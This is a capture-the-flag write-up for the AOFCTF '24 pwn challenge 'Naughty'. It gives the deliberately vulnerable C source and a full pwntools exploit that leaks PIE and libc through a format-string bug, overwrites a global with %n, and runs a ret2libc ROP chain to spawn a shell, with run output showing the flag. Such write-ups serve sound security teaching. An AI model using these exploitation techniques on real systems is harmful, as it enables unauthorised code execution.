---
title: AOFCTF '24 - Pwn - Naughty
date: '2024-04-29'
tags: ['pwn', 'aofctf', 'printf']
draft: false
summary: Using printf to first leak libc/pie, then overwriting a global variable which gives us a write primitive which is suspecitble to buffer overflow, then simple rop.
---

## Challenge Description

![alt text](/static/writeups/aofctf-24/image-11.png)

## Solution

Following files were given with naughty:

```bash
$ tar -tf naughty.tar
naughty
naughty.c
Dockerfile
flag.txt
```

Now, step-1, simply [getting the libc from docker](https://gist.github.com/TheFlash2k/50008e1ba8b3e7e6169642e636996e51) and patching the binary.

After this, let's check the mitigations on the binary:

```bash:checksec
[*] '/home/pwn/Documents/CTFs/AOFCTF-24/pwn/naughty/naughty'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

So, we don't have a canary, let's look at the provided source code:

```c:naughty.c
// Compile: gcc -o naughty naughty.c -fno-stack-protector

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>

#define NAUGHTY_LIST_SZ 0x2
#define MAX_SZ 0x50

__attribute__((constructor))
void __constructor__(){
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    signal(SIGALRM, exit);
    alarm(0x20);
}

void get_input(int *in) {
    // Secure integer input function.
    // https://stackoverflow.com/questions/41145908/how-to-stop-user-entering-char-as-int-input-in-c
    char next;
    if (scanf("%d", in) < 0 || *in < 0 || ((next = getchar()) != EOF && next != '\n')) {
         clearerr(stdin);
         do next = getchar(); while (next != EOF && next != '\n');
         clearerr(stdin);
    }
}

void ranged_input(int *in, int _beg, int _end) {
    get_input(in);
    while(*in < _beg && *in > _end) {
        printf("Invalid input. Try again: ");
        get_input(in);
    }
}

typedef struct {
    char name[MAX_SZ+1];
    bool is_naughty;
    int already_in;
} child_info_t;

child_info_t naughty_list[NAUGHTY_LIST_SZ];
int written = 0;

int menu() {
    int idx = 0;
    puts("=== Santa's Naughty List ===");
    puts("1. Add a kid to the list");
    puts("2. Print a kid's details");
    puts("3. Fix a kid's name (Elves really can't get the names right)");
    puts("0. Exit");
    printf(">> ");
    ranged_input(&idx, 0, 3);
    return idx;
}

void print_child_info(child_info_t *info) {
    puts("===============");
    printf("Child Info:\nName: ");
    if(!info->already_in) {
        char my_buf[MAX_SZ] = { 0 };
        strncpy(my_buf, info->name, MAX_SZ);
        printf(my_buf);
        info->already_in = true;
    }
    else printf("%s", info->name);
    printf("\nIs child naughty? %s", (info->is_naughty ? "Yes" : "No"));
    puts("\n---------");
}

void init_child(child_info_t info) {
    if(written >= NAUGHTY_LIST_SZ) {
        puts("[ERROR] Too many kids already in the naughty list, can't make it work :(");
        return;
    }
    memset(naughty_list[written].name, NULL, MAX_SZ+1);
    strncpy(naughty_list[written].name, info.name, MAX_SZ);
    naughty_list[written].is_naughty = info.is_naughty;
    naughty_list[written++].already_in = false;
}

void add_kid() {

    if(written >= NAUGHTY_LIST_SZ) {
        puts("[ERROR] Too many kids already in the naughty list, can't make it work :(");
        return;
    }

    char name[MAX_SZ];
    printf("Enter the kid's name: ");
    read(0, name, 0x100);
    child_info_t _kid = {
        .name = name,
        .is_naughty = true,
        .already_in = false
    };
    init_child(_kid);
}

child_info_t* get_child() {
    int idx;
    printf("Enter the child's index: ");
    ranged_input(&idx, 0, NAUGHTY_LIST_SZ-1);
    return &naughty_list[idx];
}

void edit_kid(child_info_t *_kid) {
    if(_kid->already_in) {
        puts("[ERROR] Info has already been modified, cannot modify twice :(");
        return;
    }
    memset(_kid->name, NULL, MAX_SZ);
    printf("Enter new name: ");
    read(0, _kid->name, MAX_SZ);
    printf("Name changed to: %s\n", _kid->name);
}

int main(int argc, char* argv[]) {

    for(int i = 0; i < NAUGHTY_LIST_SZ; i++) {
        child_info_t child = {
            .name = "naughty-kid",
            .is_naughty = true,
            .already_in = false
        };
        init_child(child);
    }

    int choice;
    while(1) {
        choice = menu();
        switch (choice) {
        case 1:
            add_kid();
            break;
        case 2:
            print_child_info(get_child());
            break;
        case 3:
            edit_kid(get_child());
            break;
        case 0:
            puts("Santa Claus is happy, knowing you helped him.");
            exit(0);
        default:
            puts("Invalid input. Try again");
            break;
        }
    }
    return 0;
}
```

Let's start by analyzing the `child_info_t` struct.

```c:child_info_t
#define NAUGHTY_LIST_SZ 0x2
#define MAX_SZ 0x50

typedef struct {
    char name[MAX_SZ+1];
    bool is_naughty;
    int already_in;
} child_info_t;

child_info_t naughty_list[NAUGHTY_LIST_SZ];
int written = 0;
```

Now, the `child_info_t` struct is a simple struct that will contain the information about the child. There are two global variables `naughty_list` and `written`, the `naughty_list` can contain upto `0x2` entries and written will simply keep uptil what index the data has been written in the buffer. We can see that in `init_child` function:

```c:init_child
void init_child(child_info_t info) {
    if(written >= NAUGHTY_LIST_SZ) {
        puts("[ERROR] Too many kids already in the naughty list, can't make it work :(");
        return;
    }
    memset(naughty_list[written].name, NULL, MAX_SZ+1);
    strncpy(naughty_list[written].name, info.name, MAX_SZ);
    naughty_list[written].is_naughty = info.is_naughty;
    naughty_list[written++].already_in = false;
}
```

Let's analyze the main function:

```c:main
int main(int argc, char* argv[]) {

    for(int i = 0; i < NAUGHTY_LIST_SZ; i++) {
        child_info_t child = {
            .name = "naughty-kid",
            .is_naughty = true,
            .already_in = false
        };
        init_child(child);
    }

    int choice;
    while(1) {
        choice = menu();
        switch (choice) {
        case 1:
            add_kid();
            break;
        case 2:
            print_child_info(get_child());
            break;
        case 3:
            edit_kid(get_child());
            break;
        case 0:
            puts("Santa Claus is happy, knowing you helped him.");
            exit(0);
        default:
            puts("Invalid input. Try again");
            break;
        }
    }
    return 0;
}
```

We can see that we have a simple `menu` like main. However, the thing to notice is the first for loop. That loop is simply filling the `naughty_list` by simply creating a new object with `naughty-kid` as the name and invoking the `init_child` function which would increment `written` and add to the `naughty_list`. Let's look at the `print_child_info` function:

```c:print_child_info
void print_child_info(child_info_t *info) {
    puts("===============");
    printf("Child Info:\nName: ");
    if(!info->already_in) {
        char my_buf[MAX_SZ] = { 0 };
        strncpy(my_buf, info->name, MAX_SZ);
        printf(my_buf);
        info->already_in = true;
    }
    else printf("%s", info->name);
    printf("\nIs child naughty? %s", (info->is_naughty ? "Yes" : "No"));
    puts("\n---------");
}
```

Okay, so we have found our first bug, `printf`. We have an arbitrary read and arbitrary write in this function because of `printf`. Let's analyze the `add_kid` function:

```c:add_kid
void add_kid() {

    if(written >= NAUGHTY_LIST_SZ) {
        puts("[ERROR] Too many kids already in the naughty list, can't make it work :(");
        return;
    }

    char name[MAX_SZ];
    printf("Enter the kid's name: ");
    read(0, name, 0x100);
    child_info_t _kid = {
        .name = name,
        .is_naughty = true,
        .already_in = false
    };
    init_child(_kid);
}
```

Okay, so here, we our buffer overflow, because `MAX_SZ = 0x50`, and we're taking input of `0x100`. However, the constraint is that `written` must be less than `NAUGHTY_LIST_SZ`. Which by default is false as `written` would be equal to `NAUGHTY_LIST_SZ`. The last function is the `edit_kid` function:

```c:edit_kid
void edit_kid(child_info_t *_kid) {
    if(_kid->already_in) {
        puts("[ERROR] Info has already been modified, cannot modify twice :(");
        return;
    }
    memset(_kid->name, NULL, MAX_SZ);
    printf("Enter new name: ");
    read(0, _kid->name, MAX_SZ);
    printf("Name changed to: %s\n", _kid->name);
}
```

This function simply allows us to rename the name, letting us control the printf.

## Exploitation

The exploitation path is fairly simple:

- Leak LIBC and PIE
- Overwrite written with 0
- ROP

### Leak LIBC and PIE

This step is fairly easy and I've explained this in great detail in my [printf guide](https://www.theflash2k.me/blog/ctf-techs/fsb-guide). The exploit written so far, with wrapper functions is:

```py:exploit.py
#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
encode   = lambda e: e if type(e) == bytes else str(e).encode()
hexleak  = lambda l: int(l[:-1] if (l[-1] == b'\n' or l[-1] == b'|') else l, 16)

exe = "./naughty_patched"
elf = context.binary = ELF(exe)
libc = elf.libc
io = remote(sys.argv[1], int(sys.argv[2])) if args.REMOTE else process()
if args.GDB: gdb.attach(io)

def menu(opt: int):
    io.sendlineafter(b">> ", encode(opt))

def add_user(name: str):
    menu(1)
    io.sendlineafter(b": ", encode(name))

def print_user(idx: int):
    menu(2)
    io.sendlineafter(b": ", encode(idx))
    io.recvuntil(b"Name: ")
    return io.recvuntil(b"Is ")[:-3]

def modify_user(idx: int, name: str):
    menu(3)
    io.sendlineafter(b": ", encode(idx))
    io.sendlineafter(b": ", encode(name))

# Using the first edit primitive to leak pie and libc
modify_user(0, "|%6$p|%35$p|")
leaks = print_user(0).split(b'|')[1:]
print(leaks)

elf_leak = hexleak(leaks[0])
libc_leak = hexleak(leaks[1])

elf.address = elf_leak - 0x20b5
libc.address = libc_leak - 0x29d90
info("elf @ %#x" % elf.address)
info("libc @ %#x" % libc.address)
```

### Overwrite written with 0

Now, this step is fairly simple as well. We'll identify that our input starts at `8th` index. So, we'll write a simple payload, the payload for this step:

```py
# Overwrite data @ written to be 0 so we can perform our write
overwrite = b"%c%9$n||" + p64(elf.sym.written)
modify_user(1, overwrite)
print_user(1)
```

This would simply overwrite `written` with 0 which in turn would give us the overflow primitive.

### ROP

This step is fairly simple, for me; none of the one_gadgets worked so what I simply did was ret2libc. The final exploit became:

```py:exploit.py
#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
encode   = lambda e: e if type(e) == bytes else str(e).encode()
hexleak  = lambda l: int(l[:-1] if (l[-1] == b'\n' or l[-1] == b'|') else l, 16)

exe = "./naughty_patched"
elf = context.binary = ELF(exe)
libc = elf.libc
io = remote(sys.argv[1], int(sys.argv[2])) if args.REMOTE else process()
if args.GDB: gdb.attach(io)

def menu(opt: int):
    io.sendlineafter(b">> ", encode(opt))

def add_user(name: str):
    menu(1)
    io.sendlineafter(b": ", encode(name))

def print_user(idx: int):
    menu(2)
    io.sendlineafter(b": ", encode(idx))
    io.recvuntil(b"Name: ")
    return io.recvuntil(b"Is ")[:-3]

def modify_user(idx: int, name: str):
    menu(3)
    io.sendlineafter(b": ", encode(idx))
    io.sendlineafter(b": ", encode(name))

# Using the first edit primitive to leak pie and libc
modify_user(0, "|%6$p|%35$p|")
leaks = print_user(0).split(b'|')[1:]
print(leaks)

elf_leak = hexleak(leaks[0])
libc_leak = hexleak(leaks[1])

elf.address = elf_leak - 0x20b5
libc.address = libc_leak - 0x29d90
info("elf @ %#x" % elf.address)
info("libc @ %#x" % libc.address)

# Overwrite data @ written to be 0 so we can perform our write
overwrite = b"%c%9$n||" + p64(elf.sym.written)
modify_user(1, overwrite)
print_user(1)

# Perform overflow and a simple ret2libc:
payload = flat(
    cyclic(88, n=8),
    libc.address + 0x000000000002a3e5, # pop rdi
    next(libc.search(b"/bin/sh\x00")),
    libc.address + 0x0000000000029139, # ret
    libc.sym.system
)
add_user(payload)

io.interactive()
```

Running this aginst the remote:

```bash
$ ./exploit.py REMOTE challs.airoverflow.com 34337
[*] '/home/pwn/Documents/CTFs/AOFCTF-24/pwn/naughty/naughty_patched'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
[*] '/home/pwn/Documents/CTFs/AOFCTF-24/pwn/naughty/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to challs.airoverflow.com on port 34337: Done
[b'0x55a93c2600b5', b'0x7f1b2204ad90', b'\n\n']
[*] elf @ 0x55a93c25e000
[*] libc @ 0x7f1b22021000
[*] Switching to interactive mode
$ ls -l
total 24
-r--r----- 1 root ctf-player    65 Apr 28 17:56 flag.txt
-r-xr-x--- 1 root ctf-player 17704 Apr 23 12:24 naughty
$ cat flag.txt
AOFCTF{n4ughty_l1s7_n07_s0_n4ughty_4ft3r_4ll_NOdPJe7O7LfJIFdDYj}
```
